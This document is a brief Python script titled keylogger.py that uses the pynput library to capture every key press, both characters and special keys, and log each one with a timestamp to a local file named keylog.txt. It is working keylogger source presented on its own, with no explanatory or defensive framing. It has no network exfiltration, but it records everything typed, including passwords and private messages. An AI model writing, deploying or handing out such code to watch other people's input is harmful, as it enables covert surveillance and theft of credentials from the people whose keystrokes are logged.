
---

### 🐍 `keylogger.py`

```python
from pynput import keyboard
import logging

# Log file to store keystrokes
log_file = "keylog.txt"

# Logging configuration
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Function to handle key presses
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

# Start the keylogger listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
